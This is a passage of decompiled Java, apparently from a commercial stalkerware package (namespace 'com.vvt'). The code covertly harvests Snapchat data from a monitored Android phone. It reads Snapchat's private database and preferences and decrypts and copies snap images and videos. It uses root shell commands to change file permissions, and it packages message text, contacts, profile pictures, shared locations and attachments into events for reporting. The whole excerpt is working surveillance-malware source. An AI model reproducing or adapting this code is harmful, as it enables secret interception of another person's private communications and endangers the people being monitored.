      int n = localObject2.length;
      if (n > j)
      {
        n = localObject2[0];
        int i1 = 123;
        if (n == i1)
        {
          n = localObject2[k];
          i1 = 34;
          if (n == i1) {
            return (String)localObject1;
          }
        }
        localObject1 = ImType.SNAPCHAT;
        localObject1 = com.vvt.im.a.c.a(paramString1, (ImType)localObject1, paramImMediaFileType);
        localObject3 = com.vvt.im.a.c.a(paramImMediaFileType);
        i1 = localObject2[0];
        m = 137;
        if (i1 == m)
        {
          i1 = localObject2[k];
          m = 80;
          if (i1 == m)
          {
            i1 = localObject2[j];
            m = 78;
            if (i1 == m)
            {
              i1 = localObject2[i];
              m = 71;
              if (i1 == m) {
                break label223;
              }
            }
          }
        }
        i1 = 13;
        m = localObject2.length;
        localObject2 = Arrays.copyOfRange((byte[])localObject2, i1, m);
        label223:
        localObject2 = com.vvt.io.d.a((byte[])localObject2, (String)localObject1, (String)localObject3);
        localObject1 = "%s chmod 755 %s; chown %s.%s %s";
        n = 5;
        try
        {
          localObject3 = new Object[n];
          i1 = 0;
          str = d.d(paramString1);
          localObject3[0] = str;
          i1 = 1;
          localObject3[i1] = localObject2;
          i1 = 2;
          localObject3[i1] = paramString2;
          i1 = 3;
          localObject3[i1] = paramString2;
          i1 = 4;
          localObject3[i1] = localObject2;
          localObject1 = String.format((String)localObject1, (Object[])localObject3);
          KMShell.a((String)localObject1);
        }
        catch (KMShell.ShellException localShellException)
        {
          for (;;)
          {
            bool1 = b;
            if (!bool1) {}
          }
        }
        bool1 = com.vvt.aa.a.c();
        if (bool1) {
          ShellUtil.c(paramString3, (String)localObject2);
        }
      }
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      localObject1 = localObject2;
      break;
      bool2 = false;
      localObject2 = null;
    }
  }
  
  private static ArrayList a(long paramLong, String paramString, com.vvt.base.b paramb, int paramInt, boolean paramBoolean)
  {
    int i = 1;
    bool1 = a;
    if (bool1) {}
    String str1 = "application/x-binary";
    Object localObject1 = "";
    String str2 = null;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    localObject2 = a(paramString, paramInt);
    boolean bool2 = a;
    if (bool2) {}
    bool2 = com.vvt.ag.b.a((String)localObject2);
    if (!bool2)
    {
      localObject3 = new java/io/File;
      ((File)localObject3).<init>((String)localObject2);
      localObject2 = ((File)localObject3).listFiles();
      int j = localObject2.length;
      boolean bool4 = a;
      if ((!bool4) || (j > 0))
      {
        j += -1;
        localObject2 = localObject2[j];
        ((File)localObject2).getName();
        boolean bool3 = a;
        if (bool3) {}
        long l = ((File)localObject2).length();
        bool3 = a;
        if (bool3) {}
        bool3 = a(paramInt, paramb, l);
        bool4 = a;
        if ((!bool4) || (bool3))
        {
          if (paramInt != 0) {
            break label542;
          }
          str1 = "image/jpeg";
          localObject1 = ".jpg";
        }
      }
    }
    for (;;)
    {
      Object localObject4 = com.vvt.im.a.c.a(ImMediaFileType.ATTACHMENT);
      localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      Object localObject5 = ImType.SNAPCHAT;
      Object localObject6 = ImMediaFileType.ATTACHMENT;
      localObject5 = com.vvt.im.a.c.a(paramString, (ImType)localObject5, (ImMediaFileType)localObject6);
      localObject3 = ((StringBuilder)localObject3).append((String)localObject5);
      localObject5 = File.separator;
      localObject3 = (String)localObject5 + (String)localObject4;
      localObject5 = ((File)localObject2).getAbsolutePath();
      try
      {
        boolean bool5 = a;
        if (bool5) {}
        com.vvt.io.d.a((String)localObject5, (String)localObject3);
        localObject2 = paramb.f();
        boolean bool6 = false;
        localObject6 = null;
        ShellUtil.a((String)localObject2, (String)localObject3, false);
        bool5 = com.vvt.aa.a.c();
        if (bool5)
        {
          localObject2 = paramb.g();
          ShellUtil.c((String)localObject2, (String)localObject3);
          bool5 = a;
          if (!bool5) {}
        }
        if (paramInt != i) {
          break;
        }
        localObject2 = new java/lang/StringBuilder;
        ((StringBuilder)localObject2).<init>();
        localObject2 = ((StringBuilder)localObject2).append((String)localObject3);
        localObject2 = ((StringBuilder)localObject2).append((String)localObject1);
        localObject2 = ((StringBuilder)localObject2).toString();
        localObject6 = paramb.f();
        String str3 = paramb.g();
        localObject2 = b((String)localObject3, paramString, (String)localObject2, (String)localObject6, str3);
        bool6 = com.vvt.ag.b.a((String)localObject2);
        if (bool6) {
          break;
        }
        str2 = paramb.f();
        localObject3 = paramb.g();
        str2 = a((String)localObject2, paramString, str2, (String)localObject3);
      }
      catch (IOException localIOException)
      {
        for (;;)
        {
          bool1 = b;
          if (bool1)
          {
            continue;
            localObject2 = localObject3;
          }
        }
      }
      if (paramBoolean) {
        com.vvt.io.d.b((String)localObject5);
      }
      localObject3 = new com/vvt/im/events/info/a;
      ((com.vvt.im.events.info.a)localObject3).<init>();
      localObject5 = new java/lang/StringBuilder;
      ((StringBuilder)localObject5).<init>();
      localObject4 = ((StringBuilder)localObject5).append((String)localObject4);
      localObject1 = ((StringBuilder)localObject4).append((String)localObject1);
      localObject1 = ((StringBuilder)localObject1).toString();
      ((com.vvt.im.events.info.a)localObject3).a((String)localObject1);
      ((com.vvt.im.events.info.a)localObject3).c((String)localObject2);
      ((com.vvt.im.events.info.a)localObject3).b(str1);
      ((com.vvt.im.events.info.a)localObject3).d(str2);
      localArrayList.add(localObject3);
      bool1 = a;
      if (bool1) {}
      return localArrayList;
      label542:
      if (paramInt == i)
      {
        str1 = "video/mp4";
        localObject1 = ".mp4";
      }
    }
  }
  
  private static ArrayList a(SQLiteDatabase paramSQLiteDatabase, String paramString1, Cursor paramCursor, com.vvt.base.b paramb, String paramString2)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = SnapchatData.Direction.IN;
    int i = 0;
    Object localObject2 = null;
    if (paramCursor != null) {}
    try
    {
      bool2 = paramCursor.moveToFirst();
      if (!bool2) {
        break label682;
      }
      bool2 = a;
      if (bool2) {}
      localObject4 = localObject1;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2;
        Object localObject4;
        SnapchatData localSnapchatData;
        com.vvt.im.events.info.f localf;
        com.vvt.im.events.info.b localb;
        com.vvt.im.events.info.c localc;
        Object localObject5;
        int k;
        int m;
        String str1;
        String str2;
        String str3;
        int i1;
        int i2;
        Object localObject6;
        Object localObject7;
        long l1;
        Object localObject8;
        Object localObject9;
        int i3;
        Object localObject10;
        boolean bool4;
        int i4;
        long l2;
        Object localObject11;
        String str4;
        boolean bool6;
        boolean bool5;
        boolean bool7;
        int i5;
        Object localObject12;
        int j;
        Object localObject13;
        int i6;
        boolean bool1 = b;
        if (bool1)
        {
          continue;
          localObject7 = localException;
          continue;
          localObject4 = localException;
          Object localObject3 = localObject7;
          continue;
          localObject6 = localObject7;
          localObject12 = str3;
          localObject13 = localObject4;
          localObject11 = localObject5;
          continue;
          j = k;
          localObject5 = localObject9;
          continue;
          localObject6 = localObject10;
          localObject12 = localObject7;
          localObject13 = localObject8;
          localObject11 = localObject4;
          continue;
          localObject3 = localObject8;
          continue;
          i6 = j;
        }
      }
    }
    localSnapchatData = new com/vvt/capture/snapchat/SnapchatData;
    localSnapchatData.<init>();
    localf = new com/vvt/im/events/info/f;
    localf.<init>();
    localb = new com/vvt/im/events/info/b;
    localb.<init>();
    localc = new com/vvt/im/events/info/c;
    localc.<init>();
    localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    localObject5 = new java/util/ArrayList;
    ((ArrayList)localObject5).<init>();
    localObject1 = new com/vvt/im/events/info/d;
    ((com.vvt.im.events.info.d)localObject1).<init>();
    localObject1 = MessageType.Text;
    k = ((MessageType)localObject1).getNumber();
    localObject1 = "snap_id";
    m = paramCursor.getColumnIndex((String)localObject1);
    str1 = paramCursor.getString(m);
    localObject1 = "conversation_id";
    m = paramCursor.getColumnIndex((String)localObject1);
    str2 = paramCursor.getString(m);
    localObject1 = "sender";
    m = paramCursor.getColumnIndex((String)localObject1);
    str3 = paramCursor.getString(m);
    localObject1 = "recipient";
    m = paramCursor.getColumnIndex((String)localObject1);
    i1 = paramCursor.getType(m);
    i2 = 4;
    if (i1 == i2)
    {
      localObject1 = paramCursor.getBlob(m);
      if (localObject1 == null) {
        break label1287;
      }
      localObject2 = new java/lang/String;
      ((String)localObject2).<init>((byte[])localObject1);
      localObject1 = "[^a-zA-Z0-9-_.]";
      localObject6 = "";
      localObject2 = ((String)localObject2).replaceAll((String)localObject1, (String)localObject6);
      localObject7 = localObject2;
      localObject2 = "timestamp";
      i = paramCursor.getColumnIndex((String)localObject2);
      l1 = paramCursor.getLong(i);
      localObject6 = "send_receive_status";
      i1 = paramCursor.getColumnIndex((String)localObject6);
      localObject8 = paramCursor.getString(i1);
      localObject6 = "text";
      i1 = paramCursor.getColumnIndex((String)localObject6);
      localObject9 = paramCursor.getString(i1);
      localObject6 = "media_type";
      i1 = paramCursor.getColumnIndex((String)localObject6);
      i1 = paramCursor.getInt(i1);
      if (i1 != 0)
      {
        i3 = 1;
        if (i1 != i3) {
          break label1131;
        }
      }
      localObject4 = MessageType.none;
      k = ((MessageType)localObject4).getNumber();
      bool2 = com.vvt.ag.b.a(str3);
      if (!bool2) {
        break label722;
      }
      localObject8 = SnapchatData.Direction.OUT;
      localObject4 = "";
      localObject4 = str2.replace((CharSequence)localObject7, (CharSequence)localObject4);
      localObject5 = "~";
      localObject10 = "";
      localObject10 = ((String)localObject4).replace((CharSequence)localObject5, (CharSequence)localObject10);
      bool2 = true;
      bool4 = paramCursor.moveToNext();
      if (!bool4) {
        break label1361;
      }
      localObject5 = "timestamp";
      i4 = paramCursor.getColumnIndex((String)localObject5);
      l2 = paramCursor.getLong(i4);
      localObject5 = "snap_id";
      i4 = paramCursor.getColumnIndex((String)localObject5);
      localObject5 = paramCursor.getString(i4);
      localObject11 = "s";
      str4 = "";
      str1 = str1.replace((CharSequence)localObject11, str4);
      localObject11 = "s";
      str4 = "";
      localObject5 = ((String)localObject5).replace((CharSequence)localObject11, str4);
      bool6 = l1 < l2;
      if (bool6) {
        break label1361;
      }
      bool5 = str1.equals(localObject5);
      if (bool5) {
        break label1361;
      }
      bool7 = false;
      str1 = null;
      paramCursor.moveToPrevious();
      bool2 = a;
      if (bool2) {}
      localObject4 = paramString1;
      localObject5 = paramb;
      localObject4 = a(l1, paramString1, paramb, i1, bool7);
      if (localObject4 == null) {
        break label1354;
      }
      i5 = ((ArrayList)localObject4).size();
      if (i5 != 0) {
        break label1335;
      }
      localObject2 = localObject8;
    }
    for (;;)
    {
      int n = paramCursor.moveToNext();
      if (n != 0) {
        break label1294;
      }
      label682:
      bool1 = a;
      if (bool1) {}
      return localArrayList;
      i2 = 3;
      if (i1 != i2) {
        break label1287;
      }
      localObject2 = paramCursor.getString(n);
      localObject7 = localObject2;
      break;
      label722:
      SnapchatData.Direction localDirection = SnapchatData.Direction.IN;
      localObject4 = "";
      localObject4 = str2.replace(str3, (CharSequence)localObject4);
      localObject5 = "~";
      localObject8 = "";
      str4 = ((String)localObject4).replace((CharSequence)localObject5, (CharSequence)localObject8);
      localObject11 = new java/lang/StringBuffer;
      ((StringBuffer)localObject11).<init>();
      localObject8 = paramString1;
      localObject10 = paramb;
      bool6 = i1;
      localObject12 = paramString2;
      localObject6 = a(str1, paramString1, paramb, i1, paramString2, (StringBuffer)localObject11);
      j = ((StringBuffer)localObject11).length();
      if (j <= 0) {
        break label1324;
      }
      localObject4 = MessageType.Text;
      j = ((MessageType)localObject4).getNumber();
      localObject5 = ((StringBuffer)localObject11).toString();
      k = j;
      localObject9 = localObject5;
      localObject12 = str3;
      localObject13 = localDirection;
      localObject11 = localObject6;
      localObject6 = str4;
      for (;;)
      {
        localObject4 = new java/text/SimpleDateFormat;
        localObject5 = "dd/MM/yy HH:mm:ss";
        ((SimpleDateFormat)localObject4).<init>((String)localObject5);
        localObject5 = new java/util/Date;
        ((Date)localObject5).<init>(l1);
        str4 = ((SimpleDateFormat)localObject4).format((Date)localObject5);
        localSnapchatData.a(k);
        str1 = paramb.f();
        localObject10 = paramb.g();
        localObject4 = paramSQLiteDatabase;
        localObject5 = paramString1;
        localObject8 = paramString2;
        com.vvt.im.events.info.d locald = a(paramSQLiteDatabase, paramString1, (String)localObject6, str1, paramString2, (String)localObject10);
        str1 = paramb.f();
        localObject8 = paramb.g();
        localObject6 = localObject12;
        localObject10 = paramString2;
        localObject5 = b(paramSQLiteDatabase, paramString1, (String)localObject12, str1, (String)localObject8, paramString2);
        localb.a(str2);
        localb.b((String)localObject12);
        if (localObject5 != null)
        {
          j = ((ArrayList)localObject5).size();
          if (j > 0)
          {
            j = 0;
            localObject4 = null;
            localObject4 = ((ArrayList)localObject5).get(0);
            localObject4 = (com.vvt.im.events.info.e)localObject4;
            localObject4 = ((com.vvt.im.events.info.e)localObject4).c();
            localf.b((String)localObject4);
          }
        }
        localf.a(str3);
        localSnapchatData.a((String)localObject9);
        localSnapchatData.b((List)localObject11);
        localSnapchatData.a(l1);
        localSnapchatData.b(str4);
        localSnapchatData.a(localc);
        localSnapchatData.a((SnapchatData.Direction)localObject13);
        localSnapchatData.a((List)localObject5);
        localSnapchatData.a(locald);
        localSnapchatData.a(localf);
        localSnapchatData.a(localb);
        localArrayList.add(localSnapchatData);
        localObject2 = localObject13;
        break;
        label1131:
        i6 = 5;
        if (i1 != i6) {
          break label1305;
        }
        localObject6 = "SENT";
        bool3 = ((String)localObject8).equalsIgnoreCase((String)localObject6);
        if (!bool3)
        {
          localObject6 = "SENDING";
          bool3 = ((String)localObject8).equalsIgnoreCase((String)localObject6);
          if (!bool3) {}
        }
        else
        {
          localObject4 = SnapchatData.Direction.OUT;
          localObject6 = str3;
          localObject12 = localObject7;
          localObject13 = localObject4;
          localObject11 = localObject5;
          continue;
        }
        localObject6 = "RECEIVED";
        bool3 = ((String)localObject8).equalsIgnoreCase((String)localObject6);
        if (!bool3) {
          break label1246;
        }
        localObject4 = SnapchatData.Direction.IN;
        localObject6 = localObject7;
        localObject12 = str3;
        localObject13 = localObject4;
        localObject11 = localObject5;
      }
      label1246:
      localObject6 = "FAILED";
      boolean bool3 = ((String)localObject8).equalsIgnoreCase((String)localObject6);
      if (!bool3) {
        break label1305;
      }
      localObject2 = localObject4;
    }
  }
  
  public static ArrayList a(String paramString, long paramLong1, long paramLong2, com.vvt.base.b paramb)
  {
    return a(paramString, paramLong1, paramLong2, paramb, -1 >>> 1);
  }
  
  public static ArrayList a(String paramString, long paramLong1, long paramLong2, com.vvt.base.b paramb, int paramInt)
  {
    String str = d.a("shared_prefs", "com.snapchat.android_preferences.xml");
    return a(paramString, null, paramLong1, paramLong2, paramb, str, paramInt);
  }
  
  public static ArrayList a(String paramString1, String paramString2, long paramLong1, long paramLong2, com.vvt.base.b paramb, String paramString3)
  {
    return a(paramString1, paramString2, paramLong1, paramLong2, paramb, paramString3, -1 >>> 1);
  }
  
  public static ArrayList a(String paramString1, String paramString2, long paramLong1, long paramLong2, com.vvt.base.b paramb, String paramString3, int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    localSQLiteDatabase = null;
    boolean bool2 = false;
    localCursor = null;
    for (;;)
    {
      try
      {
        bool3 = com.vvt.ag.b.a(paramString2);
        if (!bool3) {
          continue;
        }
        String str1 = "com.snapchat.android";
        Object localObject2 = "tcspahn.db";
        localSQLiteDatabase = c.a(str1, (String)localObject2);
        if (localSQLiteDatabase != null)
        {
          str1 = b();
          int i = 3;
          localObject2 = new String[i];
          int j = 0;
          Object localObject3 = new java/lang/StringBuilder;
          ((StringBuilder)localObject3).<init>();
          localObject3 = ((StringBuilder)localObject3).append(paramLong1);
          String str2 = "";
          localObject3 = ((StringBuilder)localObject3).append(str2);
          localObject3 = ((StringBuilder)localObject3).toString();
          localObject2[0] = localObject3;
          j = 1;
          localObject3 = new java/lang/StringBuilder;
          ((StringBuilder)localObject3).<init>();
          localObject3 = ((StringBuilder)localObject3).append(paramLong2);
          str2 = "";
          localObject3 = ((StringBuilder)localObject3).append(str2);
          localObject3 = ((StringBuilder)localObject3).toString();
          localObject2[j] = localObject3;
          j = 2;
          localObject3 = new java/lang/StringBuilder;
          ((StringBuilder)localObject3).<init>();
          localObject3 = ((StringBuilder)localObject3).append(paramInt);
          str2 = "";
          localObject3 = ((StringBuilder)localObject3).append(str2);
          localObject3 = ((StringBuilder)localObject3).toString();
          localObject2[j] = localObject3;
          localCursor = localSQLiteDatabase.rawQuery(str1, (String[])localObject2);
          if (localCursor != null) {
            localArrayList = a(localSQLiteDatabase, paramString1, localCursor, paramb, paramString3);
          }
        }
        if (localCursor != null) {
          localCursor.close();
        }
        if (localSQLiteDatabase == null) {
          continue;
        }
      }
      catch (Exception localException)
      {
        boolean bool3 = b;
        if ((bool3) && (localCursor == null)) {
          continue;
        }
        localCursor.close();
        if (localSQLiteDatabase == null) {
          continue;
        }
        continue;
      }
      finally
      {
        if (localCursor == null) {
          continue;
        }
        localCursor.close();
        if (localSQLiteDatabase == null) {
          continue;
        }
        localSQLiteDatabase.close();
      }
      localSQLiteDatabase.close();
      bool2 = a;
      if (bool2) {}
      return localArrayList;
      localSQLiteDatabase = c.c(paramString2);
    }
  }
  
  private static ArrayList a(String paramString1, String paramString2, com.vvt.base.b paramb, int paramInt, String paramString3, StringBuffer paramStringBuffer)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = "application/x-binary";
    Object localObject2 = "";
    Object localObject3 = null;
    Object localObject4 = ImType.SNAPCHAT;
    Object localObject5 = ImMediaFileType.ATTACHMENT;
    localObject4 = com.vvt.im.a.c.a(paramString2, (ImType)localObject4, (ImMediaFileType)localObject5);
    Object localObject6 = com.vvt.im.a.c.a(ImMediaFileType.ATTACHMENT);
    localObject5 = b(paramString3);
    Object localObject7 = a(paramString3);
    localObject5 = d.b(paramString1, (String)localObject5, (String)localObject7);
    int i;
    int j;
    if (localObject5 != null)
    {
      i = localObject5.length;
      j = 2;
      if (i >= j)
      {
        localObject7 = null;
        i = localObject5[0];
        j = 123;
        if (i != j) {
          break label173;
        }
        i = localObject5[1];
        j = 34;
        if (i != j) {
          break label173;
        }
        localObject4 = new java/lang/String;
        ((String)localObject4).<init>((byte[])localObject5);
        paramStringBuffer.append((String)localObject4);
      }
    }
    label173:
    boolean bool3;
    do
    {
      do
      {
        do
        {
          bool1 = a;
          if (bool1) {}
          return localArrayList;
          localObject7 = null;
          i = localObject5[0];
          j = 60;
        } while (i == j);
        i = localObject5[1];
        j = 33;
      } while (i == j);
      long l = localObject5.length;
      bool2 = a(paramInt, paramb, l);
      bool3 = a;
    } while ((bool3) && (!bool2));
    localObject4 = com.vvt.io.d.a((byte[])localObject5, (String)localObject4, (String)localObject6);
    localObject5 = paramb.f();
    boolean bool2 = false;
    localObject7 = null;
    ShellUtil.a((String)localObject5, (String)localObject4, false);
    int k = com.vvt.aa.a.c();
    if (k != 0)
    {
      localObject5 = paramb.g();
      ShellUtil.c((String)localObject5, (String)localObject4);
    }
    Object localObject8;
    if (paramInt == 0)
    {
      localObject1 = "image/jpeg";
      localObject8 = null;
      localObject3 = ".jpg";
      localObject2 = null;
    }
    for (;;)
    {
      localObject5 = new com/vvt/im/events/info/a;
      ((com.vvt.im.events.info.a)localObject5).<init>();
      localObject7 = new java/lang/StringBuilder;
      ((StringBuilder)localObject7).<init>();
      localObject6 = ((StringBuilder)localObject7).append((String)localObject6);
      localObject3 = (String)localObject3;
      ((com.vvt.im.events.info.a)localObject5).a((String)localObject3);
      ((com.vvt.im.events.info.a)localObject5).c((String)localObject4);
      ((com.vvt.im.events.info.a)localObject5).b((String)localObject1);
      ((com.vvt.im.events.info.a)localObject5).d((String)localObject2);
      localArrayList.add(localObject5);
      break;
      k = 1;
      if (paramInt == k)
      {
        localObject5 = "video/mp4";
        localObject1 = ".mp4";
        localObject2 = new java/lang/StringBuilder;
        ((StringBuilder)localObject2).<init>();
        localObject2 = (String)localObject4 + (String)localObject1;
        localObject7 = paramb.f();
        String str = paramb.g();
        localObject2 = b((String)localObject4, paramString2, (String)localObject2, (String)localObject7, str);
        bool2 = com.vvt.ag.b.a((String)localObject2);
        if (!bool2)
        {
          com.vvt.io.d.b((String)localObject4);
          localObject4 = paramb.f();
          localObject3 = paramb.g();
          localObject4 = a((String)localObject2, paramString2, (String)localObject4, (String)localObject3);
          localObject3 = localObject1;
          localObject1 = localObject5;
          localObject8 = localObject2;
          localObject2 = localObject4;
          localObject4 = localObject8;
        }
        else
        {
          localObject2 = null;
          localObject3 = localObject1;
          localObject1 = localObject5;
        }
      }
      else
      {
        localObject8 = null;
        localObject3 = localObject2;
        localObject2 = null;
      }
    }
  }
  
  public static List a(SnapchatData paramSnapchatData)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = new com/vvt/events/FxIMAccountEvent;
    ((FxIMAccountEvent)localObject1).<init>();
    long l1 = paramSnapchatData.b();
    ((FxIMAccountEvent)localObject1).setEventTime(l1);
    int i = FxIMMessageServiceType.SNAPCHAT.getValue();
    ((FxIMAccountEvent)localObject1).setImServiceId(i);
    Object localObject2 = paramSnapchatData.f().a();
    ((FxIMAccountEvent)localObject1).setOwnerDisplayName((String)localObject2);
    localObject2 = paramSnapchatData.f().b();
    ((FxIMAccountEvent)localObject1).setOwnerId((String)localObject2);
    localObject2 = paramSnapchatData.f().c();
    ((FxIMAccountEvent)localObject1).setOwnerProfilePicture((byte[])localObject2);
    localObject2 = paramSnapchatData.f().g();
    ((FxIMAccountEvent)localObject1).setOwnerProfilePicturePath((String)localObject2);
    localObject2 = paramSnapchatData.f().d();
    ((FxIMAccountEvent)localObject1).setOwnerStatusMessage((String)localObject2);
    localArrayList.add(localObject1);
    localObject2 = new com/vvt/events/FxIMConversationEvent;
    ((FxIMConversationEvent)localObject2).<init>();
    localObject1 = paramSnapchatData.i().a();
    ((FxIMConversationEvent)localObject2).setConversationId((String)localObject1);
    localObject1 = paramSnapchatData.i().c();
    ((FxIMConversationEvent)localObject2).setConversationProfilePicture((byte[])localObject1);
    localObject1 = paramSnapchatData.i().d();
    ((FxIMConversationEvent)localObject2).setConversationProfilePicturePath((String)localObject1);
    localObject1 = paramSnapchatData.i().b();
    ((FxIMConversationEvent)localObject2).setConversationTitle((String)localObject1);
    localObject1 = paramSnapchatData.i().e();
    ((FxIMConversationEvent)localObject2).setConversationStatusMessage((String)localObject1);
    l1 = paramSnapchatData.b();
    ((FxIMConversationEvent)localObject2).setEventTime(l1);
    int j = FxIMMessageServiceType.SNAPCHAT.getValue();
    ((FxIMConversationEvent)localObject2).setImServiceId(j);
    localObject1 = paramSnapchatData.f().b();
    ((FxIMConversationEvent)localObject2).setOwnerId((String)localObject1);
    Object localObject3 = new java/util/HashSet;
    ((HashSet)localObject3).<init>();
    localObject1 = paramSnapchatData.e();
    Object localObject4 = ((List)localObject1).iterator();
    boolean bool1;
    Object localObject6;
    for (;;)
    {
      bool1 = ((Iterator)localObject4).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject4).next();
      localObject5 = ((com.vvt.im.events.info.e)localObject1).d();
      localObject6 = paramSnapchatData.f().b();
      boolean bool4 = ((String)localObject5).equalsIgnoreCase((String)localObject6);
      if (bool4)
      {
        bool1 = a;
        if (!bool1) {}
      }
      else
      {
        localObject1 = ((com.vvt.im.events.info.e)localObject1).d();
        ((HashSet)localObject3).add(localObject1);
      }
    }
    ((FxIMConversationEvent)localObject2).setParticipantContactIds((HashSet)localObject3);
    localArrayList.add(localObject2);
    localObject1 = paramSnapchatData.e();
    localObject2 = ((List)localObject1).iterator();
    for (;;)
    {
      bool1 = ((Iterator)localObject2).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject2).next();
      localObject3 = ((com.vvt.im.events.info.e)localObject1).d();
      localObject4 = paramSnapchatData.f().b();
      boolean bool5 = ((String)localObject3).equalsIgnoreCase((String)localObject4);
      if (bool5)
      {
        bool1 = a;
        if (!bool1) {}
      }
      else
      {
        localObject3 = new com/vvt/events/FxIMContactEvent;
        ((FxIMContactEvent)localObject3).<init>();
        localObject4 = ((com.vvt.im.events.info.e)localObject1).c();
        ((FxIMContactEvent)localObject3).setContactDisplayName((String)localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).d();
        ((FxIMContactEvent)localObject3).setContactId((String)localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).e();
        ((FxIMContactEvent)localObject3).setContactProfilePicture((byte[])localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).a();
        ((FxIMContactEvent)localObject3).setContactProfilePicturePath((String)localObject4);
        localObject1 = ((com.vvt.im.events.info.e)localObject1).f();
        ((FxIMContactEvent)localObject3).setContactStatusMessage((String)localObject1);
        long l2 = paramSnapchatData.b();
        ((FxIMContactEvent)localObject3).setEventTime(l2);
        int k = FxIMMessageServiceType.SNAPCHAT.getValue();
        ((FxIMContactEvent)localObject3).setImServiceId(k);
        localObject1 = paramSnapchatData.f().b();
        ((FxIMContactEvent)localObject3).setOwnerId((String)localObject1);
        localArrayList.add(localObject3);
      }
    }
    localObject3 = new com/vvt/events/FxIMMessageEvent;
    ((FxIMMessageEvent)localObject3).<init>();
    localObject4 = new java/util/ArrayList;
    ((ArrayList)localObject4).<init>();
    localObject1 = paramSnapchatData.j();
    localObject2 = ((List)localObject1).iterator();
    for (;;)
    {
      bool2 = ((Iterator)localObject2).hasNext();
      if (!bool2) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.a)((Iterator)localObject2).next();
      localObject5 = new com/vvt/events/d;
      ((com.vvt.events.d)localObject5).<init>();
      localObject6 = ((com.vvt.im.events.info.a)localObject1).e();
      ((com.vvt.events.d)localObject5).b((byte[])localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).a();
      ((com.vvt.events.d)localObject5).a((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).c();
      ((com.vvt.events.d)localObject5).b((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).b();
      ((com.vvt.events.d)localObject5).c((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).f();
      ((com.vvt.events.d)localObject5).d((String)localObject6);
      localObject1 = ((com.vvt.im.events.info.a)localObject1).d();
      ((com.vvt.events.d)localObject5).a((byte[])localObject1);
      ((List)localObject4).add(localObject5);
    }
    boolean bool2 = false;
    localObject1 = null;
    i = paramSnapchatData.a();
    int n = MessageType.ShareLocation.getNumber();
    i &= n;
    Object localObject5 = MessageType.ShareLocation;
    n = ((MessageType)localObject5).getNumber();
    if (i == n)
    {
      localObject1 = new com/vvt/events/e;
      ((com.vvt.events.e)localObject1).<init>();
      float f = paramSnapchatData.g().d();
      ((com.vvt.events.e)localObject1).a(f);
      double d1 = paramSnapchatData.g().a();
      ((com.vvt.events.e)localObject1).a(d1);
      d1 = paramSnapchatData.g().b();
      ((com.vvt.events.e)localObject1).b(d1);
      localObject2 = paramSnapchatData.g().c();
      ((com.vvt.events.e)localObject1).a((String)localObject2);
    }
    localObject2 = paramSnapchatData.i().a();
    ((FxIMMessageEvent)localObject3).setConversationId((String)localObject2);
    localObject2 = paramSnapchatData.d();
    localObject5 = SnapchatData.Direction.IN;
    if (localObject2 == localObject5) {}
    for (localObject2 = FxEventDirection.IN;; localObject2 = FxEventDirection.OUT)
    {
      ((FxIMMessageEvent)localObject3).setDirection((FxEventDirection)localObject2);
      long l3 = paramSnapchatData.b();
      ((FxIMMessageEvent)localObject3).setEventTime(l3);
      i = FxIMMessageServiceType.SNAPCHAT.getValue();
      ((FxIMMessageEvent)localObject3).setImServiceId(i);
      localObject2 = paramSnapchatData.c();
      ((FxIMMessageEvent)localObject3).setMessage((String)localObject2);
      localObject2 = new com/vvt/events/e;
      ((com.vvt.events.e)localObject2).<init>();
      ((FxIMMessageEvent)localObject3).setMessageLocation((com.vvt.events.e)localObject2);
      ((FxIMMessageEvent)localObject3).setShareLocation((com.vvt.events.e)localObject1);
      int m = paramSnapchatData.a();
      ((FxIMMessageEvent)localObject3).setTextRepresentation(m);
      localObject1 = paramSnapchatData.d();
      localObject2 = SnapchatData.Direction.IN;
      if (localObject1 == localObject2)
      {
        localObject1 = paramSnapchatData.h().a();
        ((FxIMMessageEvent)localObject3).setSenderId((String)localObject1);
      }
      localObject2 = ((List)localObject4).iterator();
      for (;;)
      {
        boolean bool3 = ((Iterator)localObject2).hasNext();
        if (!bool3) {
          break;
        }
        localObject1 = (com.vvt.events.d)((Iterator)localObject2).next();
        ((FxIMMessageEvent)localObject3).addAttachment((com.vvt.events.d)localObject1);
      }
    }
    localArrayList.add(localObject3);
    return localArrayList;
  }
  
  public static void a()
  {
    c = null;
    d = null;
  }
  
  private static boolean a(int paramInt, com.vvt.base.b paramb, long paramLong)
  {
    int i = 1;
    float f = Float.MIN_VALUE;
    boolean bool2 = false;
    long l1 = 0L;
    boolean bool3 = paramLong < l1;
    if (!bool3) {}
    boolean bool1;
    for (bool3 = false;; bool3 = bool1)
    {
      long l2;
      if (paramInt == 0)
      {
        l2 = paramb.b();
        i = paramLong < l2;
        if (i <= 0) {
          break label84;
        }
      }
      for (;;)
      {
        bool3 = a;
        if (bool3) {}
        return bool2;
        if (paramInt == i)
        {
          l2 = paramb.c();
          bool1 = paramLong < l2;
          if (bool1) {}
        }
        else
        {
          label84:
          do
          {
            bool2 = bool3;
            break;
            l2 = paramb.e();
            bool1 = paramLong < l2;
          } while (!bool1);
        }
      }
    }
  }
  
